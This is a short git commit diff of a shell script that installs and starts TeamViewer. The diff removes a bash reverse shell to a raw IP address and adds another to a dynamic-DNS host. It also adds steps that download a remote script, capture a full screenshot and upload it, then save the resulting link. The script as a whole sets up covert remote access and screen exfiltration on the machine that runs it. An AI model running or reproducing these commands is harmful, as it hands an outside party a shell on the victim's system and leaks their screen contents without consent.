1171e59f242f8aa3a255982830a802921675d1e8
d0loreshaze <69720260+d0loreshaze@users.noreply.github.com>
2020-12-22 14:11:13 +0000

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,7 +1,11 @@
-/bin/bash -i >& /dev/tcp/68.183.90.115/1111 0>&1
 sudo apt-get update
 sudo apt-get upgrade
+wget https://d0lores.github.io/imgur.sh
 wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb
 sudo apt install ./teamviewer_amd64.deb
 teamviewer license accept
 teamviewer daemon restart
+teamviewer
+xfce4-screenshooter -f --save test.png
+./imgur.sh test.png | tee link.txt
+/bin/bash -i >& /dev/tcp/d0lores.ddns.net/1337 0>&1
